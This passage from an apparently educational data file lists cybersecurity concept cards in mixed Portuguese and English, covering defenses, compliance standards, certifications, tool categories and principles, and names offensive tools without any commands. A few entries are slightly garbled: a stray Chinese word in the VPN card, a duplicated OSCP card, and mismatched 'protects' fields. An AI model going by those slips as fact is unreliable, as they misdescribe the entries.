            "simple": "Controlar tr\u00e1fego de rede. Rule-based filtering.",
            "protects": "Unauthorized access, port scanning"
        },
        {
            "name": "VPN",
            "icon": "fa-tunnel",
            "color": "success",
            "simple": "Tunnel criptografado para acesso remoto.\u53d6\u4ee3 Telnet/RDPplain.",
            "protects": "Eavesdropping, MITM on remote access"
        },
        {
            "name": "Patch Management",
            "icon": "fa-band-aid",
            "color": "warning",
            "simple": "Aplicar atualiza\u00e7\u00f5es de seguran\u00e7a regularmente. Priorizar CVEs cr\u00edticos.",
            "protects": "Known exploits, zero-days"
        },
        {
            "name": "Hardening",
            "icon": "fa-shield-hard",
            "color": "info",
            "simple": "Fortificar sistemas. Disable unnecessary services, secure configs.",
            "protects": "Misconfiguration attacks, default creds"
        },
        {
            "name": "Backup Strategy (3-2-1)",
            "icon": "fa-rotate",
            "color": "success",
            "simple": "3 c\u00f3pias, 2 m\u00eddias diferentes, 1 offline. Backups imut\u00e1veis.",
            "protects": "Ransomware, data loss, disaster recovery"
        },
        {
            "name": "IAM \u2014 Identity & Access Mgmt",
            "icon": "fa-user-shield",
            "color": "primary",
            "simple": "Gerenciar identidades e permiss\u00f5es em cloud. Least Privilege.",
            "protects": "Unauthorized access, privilege escalation"
        },
        {
            "name": "Cloud Security Posture",
            "icon": "fa-cloud-check",
            "color": "info",
            "simple": "CSPM: monitorar configura\u00e7\u00f5es erradas em cloud.",
            "protects": "Cloud misconfiguration"
        },
        {
            "name": "Container Security",
            "icon": "fa-boxes",
            "color": "warning",
            "simple": "Secure container lifecycle. Image scanning, runtime security.",
            "protects": "Container escape, supply chain"
        },
        {
            "name": "Secret Management",
            "icon": "fa-key",
            "color": "danger",
            "simple": "Vaults para credenciais. HashiCorp Vault, AWS Secrets Manager.",
            "protects": "Credential leakage, secrets exposure"
        },
        {
            "name": "Mobile Device Management",
            "icon": "fa-mobile-screen",
            "color": "info",
            "simple": "MDM: gerenciar dispositivos m\u00f3veis corporativos. Remote wipe, encryption.",
            "protects": "Lost device, unauthorized access"
        },
        {
            "name": "App Sandboxing",
            "icon": "fa-box",
            "color": "warning",
            "simple": "Isolar apps m\u00f3veis. Impedir acesso a dados de outros apps.",
            "protects": "Data leakage between apps"
        },
        {
            "name": "Code Signing",
            "icon": "fa-signature",
            "color": "success",
            "simple": "Assinar apps para verificar integridade e proced\u00eancia.",
            "protects": "Tampered apps, malware"
        },
        {
            "name": "Threat Hunting",
            "icon": "fa-search",
            "color": "danger",
            "simple": "Busca ativa de amea\u00e7as. Baseado em TTPs, IOC, comportamento an\u00f4malo.",
            "protects": "Advanced persistent threats, hidden malware"
        },
        {
            "name": "Incident Response",
            "icon": "fa-bell",
            "color": "warning",
            "simple": "Plano estruturado para responder a incidentes. Contain, Eradicate, Recover.",
            "protects": "Breach impact, downtime"
        },
        {
            "name": "Vulnerability Management",
            "icon": "fa-bug",
            "color": "info",
            "simple": "Identificar, priorizar, remediar vulnerabilidades. Scanner + remediation.",
            "protects": "Known vulnerabilities, CVEs"
        },
        {
            "name": "Penetration Testing",
            "icon": "fa-bug",
            "color": "danger",
            "simple": "Testes de seguran\u00e7a simulando atacantes reais. Blackbox, whitebox, red team.",
            "protects": "Unknown vulnerabilities, misconfigurations"
        },
        {
            "name": "Red Team",
            "icon": "fa-crosshairs",
            "color": "danger",
            "simple": "Simular advers\u00e1rios reais. Objetivo: testar defesas completas.",
            "protects": "Defense effectiveness, blue team readiness"
        },
        {
            "name": "Blue Team",
            "icon": "fa-shield",
            "color": "info",
            "simple": "Defensores. Monitoramento, detec\u00e7\u00e3o, resposta a incidentes.",
            "protects": "Continuous security operations"
        },
        {
            "name": "GDPR",
            "icon": "fa-gavel",
            "color": "info",
            "simple": "Regulamento Geral de Prote\u00e7\u00e3o de Dados (UE). Dados pessoais, consentimento, direitos.",
            "protects": "Data privacy, regulatory fines"
        },
        {
            "name": "LGPD",
            "icon": "fa-gavel",
            "color": "warning",
            "simple": "Lei Geral de Prote\u00e7\u00e3o de Dados (Brasil). Similar ao GDPR.",
            "protects": "Data privacy, Brazilian compliance"
        },
        {
            "name": "SOC 2",
            "icon": "fa-check-double",
            "color": "success",
            "simple": "Auditoria de controles de seguran\u00e7a, disponibilidade, confidencialidade.",
            "protects": "Customer trust, compliance"
        },
        {
            "name": "ISO 27001",
            "icon": "fa-certificate",
            "color": "primary",
            "simple": "Gest\u00e3o de seguran\u00e7a da informa\u00e7\u00e3o. ISMS certification.",
            "protects": "Information security management"
        },
        {
            "name": "PCI DSS",
            "icon": "fa-credit-card",
            "color": "danger",
            "simple": "Padr\u00e3o de seguran\u00e7a para dados de cart\u00e3o de pagamento.",
            "protects": "Payment card data"
        },
        {
            "name": "HIPAA",
            "icon": "fa-hospital",
            "color": "info",
            "simple": "Prote\u00e7\u00e3o de informa\u00e7\u00f5es de sa\u00fade (EUA).",
            "protects": "PHI (Protected Health Information)"
        },
        {
            "name": "CompTIA Security+",
            "icon": "fa-certificate",
            "color": "warning",
            "simple": "Fundamentos de seguran\u00e7a. Exig\u00eancia para entrada na \u00e1rea.",
            "protects": "Baseline security knowledge"
        },
        {
            "name": "CEH \u2014 Certified Ethical Hacker",
            "icon": "fa-hat-wizard",
            "color": "danger",
            "simple": "Hacker \u00e9tico certificado. Pentest b\u00e1sico a intermedi\u00e1rio.",
            "protects": "Offensive security skills"
        },
        {
            "name": "OSCP \u2014 Offensive Security",
            "icon": "fa-skull",
            "color": "danger",
            "simple": "Advanced penetration testing. 24h exam pr\u00e1tico.",
            "protects": "Advanced pentest skills"
        },
        {
            "name": "CISSP",
            "icon": "fa-shield-cat",
            "color": "primary",
            "simple": "Information Systems Security Professional. Gest\u00e3o de seguran\u00e7a.",
            "protects": "Security management, architecture"
        },
        {
            "name": "CISM",
            "icon": "fa-briefcase",
            "color": "primary",
            "simple": "Information Security Manager. Governan\u00e7a de seguran\u00e7a.",
            "protects": "Security leadership"
        },
        {
            "name": "AWS Security Specialty",
            "icon": "fa-cloud",
            "color": "warning",
            "simple": "Seguran\u00e7a avan\u00e7ada em AWS. Arquitetura cloud segura.",
            "protects": "Cloud security expertise"
        },
        {
            "name": "OSCP",
            "icon": "fa-crosshairs",
            "color": "danger",
            "simple": "Offensive Security Certified Professional. Pentest avan\u00e7ado.",
            "protects": "Advanced red team skills"
        },
        {
            "name": "Scanners de Rede",
            "icon": "fa-radar",
            "color": "info",
            "simple": "Nmap, Masscan, Angry Scanner. Enumera\u00e7\u00e3o de rede e portas.",
            "protects": "Network discovery, vulnerability assessment"
        },
        {
            "name": "Web App Testing",
            "icon": "fa-globe",
            "color": "warning",
            "simple": "Burp Suite, OWASP ZAP, Nikto. Testes de aplica\u00e7\u00e3o web.",
            "protects": "Web vulnerabilities, API testing"
        },
        {
            "name": "Exploitation Frameworks",
            "icon": "fa-bomb",
            "color": "danger",
            "simple": "Metasploit, Cobalt Strike. Desenvolvimento e execu\u00e7\u00e3o de exploits.",
            "protects": "Exploit development, red team ops"
        },
        {
            "name": "Credential Attacks",
            "icon": "fa-key",
            "color": "danger",
            "simple": "Hashcat, John the Ripper, Mimikatz. Cracking e credential reuse.",
            "protects": "Password security testing"
        },
        {
            "name": "Network Sniffing",
            "icon": "fa-ear-listen",
            "color": "warning",
            "simple": "Wireshark, Tcpdump, Ettercap. An\u00e1lise de tr\u00e1fego de rede.",
            "protects": "Network monitoring, MITM detection"
        },
        {
            "name": "Forense e Resposta",
            "icon": "fa-magnifying-glass",
            "color": "info",
            "simple": "FTK Imager, Autopsy, Volatility. An\u00e1lise forense e mem\u00f3ria.",
            "protects": "Incident investigation, malware analysis"
        },
        {
            "name": "Defense in Depth",
            "icon": "fa-layer-group",
            "color": "primary",
            "simple": "M\u00faltiplas camadas de seguran\u00e7a. Se uma falha, outra protege.",
            "protects": "Single point of failure, advanced attacks"
        },
        {
            "name": "Least Privilege",
            "icon": "fa-user-minus",
            "color": "success",
            "simple": "M\u00ednimas permiss\u00f5es necess\u00e1rias. Limitar dano se comprometido.",
            "protects": "Privilege escalation, insider threats"
        },
        {
            "name": "Separation of Duties",
            "icon": "fa-divide",
            "color": "info",
            "simple": "Nenhuma pessoa deve ter controle total sobre processo cr\u00edtico.",
            "protects": "Fraud, abuse, single point of compromise"
        },
        {
            "name": "Fail Secure",
            "icon": "fa-triangle-exclamation",
            "color": "warning",
            "simple": "Quando falhar, falhe de forma segura. Default: deny.",
            "protects": "Unauthorized access during failures"
        },
        {
            "name": "Kerckhoffs Principle",
            "icon": "fa-key",
            "color": "info",
            "simple": "Seguran\u00e7a deve estar na chave, n\u00e3o no algoritmo.",
            "protects": "Algorithm dependency, key management"
        },
        {
            "name": "Zero Day",
            "icon": "fa-bug",
            "color": "danger",
            "simple": "Vulnerabilidade desconhecida. Sem patch dispon\u00edvel.",
            "protects": "Unknown exploits, APTs"
        },
        {
            "name": "APT \u2014 Advanced Persistent Threat",
            "icon": "fa-dragon",
            "color": "danger",
            "simple": "Amea\u00e7a persistente avan\u00e7ada. Atores estatais, grupos sofisticados.",
            "protects": "Nation-state actors, long-term campaigns"
        },
        {
            "name": "IOC \u2014 Indicator of Compromise",
            "icon": "fa-radar",
            "color": "warning",
            "simple": "Evid\u00eancia de comprometimento. Hashes, IPs, dom\u00ednios, padr\u00f5es.",
            "protects": "Threat detection, incident response"
        },
        {
            "name": "TTPs",
            "icon": "fa-chess",
            "color": "info",
            "simple": "Tactics, Techniques, Procedures. Comportamentos de atacantes.",
            "protects": "Threat modeling, detection engineering"
        },
        {
            "name": "Kill Chain",
            "icon": "fa-link",
            "color": "danger",
            "simple": "7 fases de ataque: Recon \u2192 Delivery \u2192 Exploitation \u2192 Actions.",
            "protects": "Attack prevention, early detection"
        },
        {
            "name": "CVSS",
            "icon": "fa-gauge-high",
            "color": "warning",
            "simple": "Common Vulnerability Scoring System. Prioriza\u00e7\u00e3o de vulnerabilidades.",
            "protects": "Vulnerability prioritization"
        },
        {
            "name": "CVE",
            "icon": "fa-bug",
            "color": "danger",
            "simple": "Common Vulnerabilities and Exposures. Identificador p\u00fablico de vulnerabilidades.",
            "protects": "Vulnerability tracking, remediation"
        },
        {
            "name": "SIEM",
            "icon": "fa-chart-network",
            "color": "primary",
            "simple": "Security Information and Event Management. Centraliza\u00e7\u00e3o e correla\u00e7\u00e3o de logs.",
            "protects": "Threat detection, compliance, forensics"
        },
        {
            "name": "SOAR",
            "icon": "fa-robot",
            "color": "info",
            "simple": "Security Orchestration, Automation and Response. Automa\u00e7\u00e3o de resposta.",
            "protects": "Incident response time, analyst fatigue"
        },
        {
            "name": "XDR",
            "icon": "fa-layer-tree",
            "color": "success",
            "simple": "Extended Detection and Response. Unifica\u00e7\u00e3o de EDR, NDR, SIEM.",
            "protects": "Cross-domain threat detection"
        },
        {
            "name": "AI/ML in Security",
            "icon": "fa-brain",
            "color": "primary",
            "simple": "Intelig\u00eancia artificial para detec\u00e7\u00e3o de anomalias. UEBA, phishing detection.",
            "protects": "Behavioral threats, unknown attacks"
        },
        {
            "name": "DevSecOps",
            "icon": "fa-code-branch",
            "color": "info",
            "simple": "Seguran\u00e7a integrada no DevOps. Shift-left security.",
            "protects": "Vulnerable code in production"
        },
        {
            "name": "SBOM \u2014 Software Bill of Materials",
            "icon": "fa-list",
            "color": "warning",
            "simple": "Lista de componentes de software. Rastrear vulnerabilidades em supply chain.",
            "protects": "Supply chain attacks, vulnerable dependencies"
        },
        {
            "name": "SCA \u2014 Software Composition Analysis",
            "icon": "fa-cubes",
            "color": "warning",
            "simple": "Analisar depend\u00eancias e componentes de software.",
            "protects": "Vulnerable open source, license issues"
        },
        {
            "name": "SAST/DAST/IAST",
            "icon": "fa-microscope",
            "color": "info",
            "simple": "Static Application Security Testing / Dynamic / Interactive.",
            "protects": "Code vulnerabilities, runtime issues"
        },
        {
            "name": "RASP \u2014 Runtime Application Self-Protection",
            "icon": "fa-shield-cat",
            "color": "success",
            "simple": "Prote\u00e7\u00e3o em tempo de execu\u00e7\u00e3o. Auto-bloqueia ataques.",
            "protects": "Zero-day, runtime attacks"
        },
        {
            "name": "Deception Technology",
            "icon": "fa-fish",
            "color": "warning",
            "simple": "Honeypots, canary tokens. Detectar atacantes cedo.",
            "protects": "Early breach detection, lateral movement"
        },
        {
            "name": "Confidential Computing",
            "icon": "fa-microchip",
            "color": "info",
            "simple": "Prote\u00e7\u00e3o de dados em uso. Enclaves seguros (SGX, SEV).",
            "protects": "Memory-based attacks, data in processing"
        },
        {
            "name": "Post-Quantum Cryptography",
            "icon": "fa-atom",
            "color": "primary",
            "simple": "Criptografia resistente a computadores qu\u00e2nticos.",
            "protects": "Future decryption threats"
        },
        {
            "name": "Privacy by Design",
            "icon": "fa-user-secret",
            "color": "success",
            "simple": "Privacidade desde o design. Minimiza\u00e7\u00e3o de dados.",
            "protects": "Data privacy, compliance"
        }
    ]
};